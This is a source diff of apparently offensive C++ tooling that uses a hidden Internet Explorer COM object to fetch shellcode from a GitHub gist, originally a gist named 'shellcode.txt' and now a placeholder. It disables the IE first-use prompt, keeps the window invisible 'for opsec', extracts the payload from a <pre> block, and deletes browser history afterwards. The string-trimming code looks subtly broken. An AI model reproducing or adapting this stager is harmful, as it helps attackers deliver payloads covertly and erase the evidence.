@@ -1,6 +1,5 @@
 
 #include "headers.h"
-#include <comdef.h>
 #include <objbase.h>
 
 
@@ -80,8 +79,6 @@ int history_cleanup() {
 
 
 
-
-
 // BSTR to Char conversion function:
 char* BSTRtoChar(BSTR String)
 {
@@ -97,7 +94,6 @@ char* BSTRtoChar(BSTR String)
 	FinalChar[i] = 0;
 	return FinalChar;
 }
-
 
 
 BOOL disable_ie_prompt() {
@@ -138,8 +134,6 @@ BOOL disable_ie_prompt() {
 
 
 
-
-
 char * download() {
 
 	// Disable IE First-use prompt 
@@ -172,12 +166,12 @@ char * download() {
 	}
 	else {
 
-		printf("IE COM Initialization Success\n");
+		printf(" [*] IE COM Initialization Success\n");
 	}
 
 	LPOLESTR pszTerminalCLSID = NULL;
 	HRESULT hr = StringFromCLSID(clsid, &pszTerminalCLSID);
-	printf("IE CLSID ?:  %ws\n", pszTerminalCLSID);
+	//printf("IE CLSID ?:  %ws\n", pszTerminalCLSID);
 
 	// We have a valid ClassID for IE now ?
 
@@ -208,25 +202,24 @@ char * download() {
 	pUnknown->Release();
 
 
+	// Replace your github or any raw link of UUIDs below
+	 OLECHAR test[] = L"https://gist.githubusercontent.com/xxx/xx/raw/xxx/test.txt";
 
-	OLECHAR test[] = L"https://gist.githubusercontent.com/pwn1sher/7b837de56493248c78873609ef51fba6/raw/8e30a5ca4da92251ded2db222f7195a637b64ac7/shellcode.txt";
-
-	// 2. navigate to URL
+	 // 2. navigate to URL
 	BSTR bstrUrl = SysAllocString(test);
 	var.vt = VT_I4; // 4 byte signed int
 	var.lVal = 0;
 
-	// Change it to FALSE Later for opsec
+	// Change it to FALSE Later !
 	if (webBrowserPtr->put_Visible(VARIANT_FALSE) != S_OK) {
 		printf("Failed to put visiblity false\n");
 	}
 
-
-	printf("Opening URL: %ws\n", test);
-
+	printf(" [*] Fetching Shellcode using IECOM from: %ws\n", test);
 
 	// Visit the URL!
 	webBrowserPtr->Navigate(bstrUrl, &var, &var, &var, &var);
+	
 	SysFreeString(bstrUrl);
 
 
@@ -249,7 +242,7 @@ char * download() {
 
 	// 5. print the <title>
 	pHTML->get_title(&bstrUrl);
-	printf("Title: %ws\n", bstrUrl);
+	// printf("Title: %ws\n", bstrUrl);
 
 	IHTMLElement* lpBodyElm;
 	HRESULT hrGetBody = pHTML->get_body(&lpBodyElm);
@@ -262,13 +255,15 @@ char * download() {
 	BSTR bstrBody;
 	HRESULT hrGetInrHTMl = lpParentElm->get_innerHTML(&bstrBody);
 
-
-
 	char* p2str;
 	char* body;
 	body = BSTRtoChar(bstrBody);
 
+	// printf("Body: %s", body);
 
+	//printf("reached \n");
+
+	// works fine till here
 	char s2[] = "<pre>";
 
 	char* p1, * p2, * p3;
@@ -281,10 +276,27 @@ char * download() {
 
 	if (p1) {
 		p2 = strstr(p1, "</pre>");
-		if (p2) sprintf_s(out, "%.*s", int(p2 - p1 - 5), p1 + 5);
-		printf("huh: %s\n\n\n", out);
-	}
 
+	//	printf("\n p1 %s\n", p1);
+
+		//cut off initial bytes
+		p1 += 5;
+
+		// cut off last bytes
+		p1[strlen(p1) - 1] = '\0';
+		p1[strlen(p1) - 2] = '\0';
+		p1[strlen(p1) - 3] = '\0';
+		p1[strlen(p1) - 4] = '\0';
+		p1[strlen(p1) - 2] = '\0';
+		p1[strlen(p1) - 1] = '\0';
+
+
+		// printf("\n p1 modified %s\n", p1);
+
+
+		//if (p2) sprintf_s(out, "%.*s", int(p2 - p1 - 5), p1 + 5);
+		// printf("huh: %s\n\n\n", p1);
+	}
 
 
 	// Delete IE History
@@ -298,5 +310,5 @@ char * download() {
 	CoUninitialize();
 
 
-	return out;
+	return p1;
 }
